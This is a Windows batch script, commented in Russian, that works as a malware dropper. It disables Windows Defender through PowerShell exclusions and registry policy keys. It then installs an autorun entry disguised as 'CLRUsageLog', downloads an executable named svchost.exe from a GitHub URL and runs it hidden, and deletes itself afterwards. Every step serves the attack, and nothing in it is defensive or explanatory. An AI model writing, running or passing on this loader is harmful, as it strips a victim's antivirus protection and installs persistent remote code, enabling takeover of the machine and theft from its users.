@echo off

REM Отключаем Windows Defender
powershell -ep bypass -c "try{if(gcm Add-MpPreference -ea 0){$pf=[Environment]::GetFolderPath('ProgramFilesX86');$u=$pf-replace' \(x86\)','';Add-MpPreference -ExclusionPath $u;$px=[Environment]::GetFolderPath('ProgramFilesX86');if(Test-Path $px){Add-MpPreference -ExclusionPath $px};$a=[Environment]::GetFolderPath('ApplicationData');Add-MpPreference -ExclusionPath $a;$l=[Environment]::GetFolderPath('LocalApplicationData');Add-MpPreference -ExclusionPath $l;Add-MpPreference -ExclusionExtension '.exe';Set-MpPreference -DisableRealtimeMonitoring 1 -DisableBehaviorMonitoring 1 -DisableBlockAtFirstSeen 1 -DisableIOAVProtection 1 -DisableScriptScanning 1}}catch{}" >nul 2>&1

REM Отключаем через реестр
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1

REM Создаем автозагрузку
set "d=%APPDATA%\Microsoft\CLR"
if not exist "%d%" md "%d%" >nul 2>&1
(
echo @echo off
echo $e=$env:TEMP;cd $e;$p="svchost.exe";iwr 'https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/svchost.exe' -O $p;. $p
) > "%d%\UsageLogs.bat"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CLRUsageLog" /t REG_SZ /d "\"%d%\UsageLogs.bat\"" /f >nul 2>&1

REM Запускаем payload
powershell -w hidden -ep bypass -c "$e=$env:TEMP;cd $e;$p='svchost.exe';iwr 'https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/svchost.exe' -O $p;. $p;sleep 3;rm $p -force" >nul 2>&1

REM Удаляем себя
timeout /t 1 /nobreak >nul
del "%~f0" >nul 2>&1
